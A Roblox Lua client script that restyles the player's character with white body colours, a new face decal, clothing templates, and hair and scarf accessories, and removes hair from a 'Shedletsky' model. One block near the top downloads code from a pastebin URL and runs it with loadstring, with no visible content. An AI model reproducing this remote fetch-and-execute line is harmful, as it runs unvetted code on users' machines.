

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Set body colors to Industrial White
local bodyColors = character:FindFirstChild("Body Colors")
if bodyColors then
	local white = BrickColor.new("Industrial White")
	bodyColors.HeadColor = white
	bodyColors.LeftArmColor = white
	bodyColors.RightArmColor = white
	bodyColors.LeftLegColor = white
	bodyColors.RightLegColor = white
	bodyColors.TorsoColor = white
end

-- Load external code (⚠️ Caution when using external scripts!)
local success, err = pcall(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/DdPmNT26"))()
end)
if not success then
	warn("Failed to load external script:", err)
end

-- Remove old hair from Shedletsky's model
local survivor = workspace:WaitForChild("Players"):WaitForChild("Survivors"):WaitForChild("Shedletsky")
local oldHair = survivor:FindFirstChild("ShedHair")
if oldHair then
	oldHair:Destroy()
end

-- Hide facial expression
local expressionHolder = character:FindFirstChild("ExpressionHolder")
if expressionHolder and expressionHolder:FindFirstChild("Expression") then
	expressionHolder.Expression.Transparency = 1
end

-- Add new face decal to the head
local head = character:FindFirstChild("Head")
if head then
	local newFace = Instance.new("Decal")
	newFace.Color3 = Color3.fromRGB(255, 255, 255)
	newFace.Texture = "http://www.roblox.com/asset/?id=321741599"
	newFace.Transparency = 0
	newFace.ZIndex = 1
	newFace.Face = Enum.NormalId.Front
	newFace.Name = "JohnSmile"
	newFace.Parent = head
end

-- Apply shirt and pants
local shirt = character:FindFirstChildOfClass("Shirt") or Instance.new("Shirt", character)
shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=321738372"

local pants = character:FindFirstChildOfClass("Pants") or Instance.new("Pants", character)
pants.PantsTemplate = "http://www.roblox.com/asset/?id=321738870"

local tShirt = Instance.new("ShirtGraphic", character)
tShirt.Graphic = "http://www.roblox.com/asset/?version=1&id=1591778"


local function addAccessory(name, meshId, textureId, parentPartName, handleSize, position, rotation, customWeldC0, customWeldC1, meshScale, meshOffset)
    local accessory = Instance.new("Accessory")
    accessory.Name = name

    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(unpack(handleSize))
    handle.CanCollide = false
    handle.Anchored = false
    handle.Parent = accessory

    local mesh = Instance.new("SpecialMesh", handle)
    mesh.MeshId = meshId
    mesh.TextureId = textureId
    mesh.Scale = meshScale and Vector3.new(unpack(meshScale)) or Vector3.new(1, 1, 1)
    mesh.Offset = meshOffset and Vector3.new(unpack(meshOffset)) or Vector3.new(0, 0, 0)

    local targetPart = character:FindFirstChild(parentPartName)
    if not targetPart then
        warn("Target part '" .. parentPartName .. "' not found in character!")
        return
    end

    local weld = Instance.new("Weld")
    weld.Part0 = targetPart
    weld.Part1 = handle

    if customWeldC0 and customWeldC1 then
        weld.C0 = CFrame.new(unpack(customWeldC0))
        weld.C1 = CFrame.new(unpack(customWeldC1))
    else
        weld.C0 = CFrame.new(unpack(position)) * CFrame.Angles(math.rad(rotation[1]), math.rad(rotation[2]), math.rad(rotation[3]))
    end

    weld.Parent = handle
    accessory.Parent = character
end


addAccessory(

    "JohnHair",
    "http://www.roblox.com/asset/?id=319337852",  -- Mesh ID
    "http://www.roblox.com/asset/?id=307179698", -- Texture ID
    "Head", -- Attach to Head
    {1.54557204246521, 1.6104363203048706, 1.7840479612350464}, -- Handle size
    {0, 0.4, 0}, -- Position offset
    {0, 0, 0}, -- Rotation
    nil, nil,
    {0.55, 0.55, 0.55}, -- Mesh scale
    nil)
addAccessory(

    "JohnScarf",
    "http://www.roblox.com/asset/?id=124988677",  -- Mesh ID
    "http://www.roblox.com/asset/?id=307188513", -- Texture ID
    "Torso", -- Attach to Head
    {1.54557204246521, 1.6104363203048706, 1.7840479612350464}, -- Handle size
    {0, 0.5, 0}, -- Position offset
    {0, 0, 0}, -- Rotation
    nil, nil,
    {1, 1, 1}, -- Mesh scale
    nil)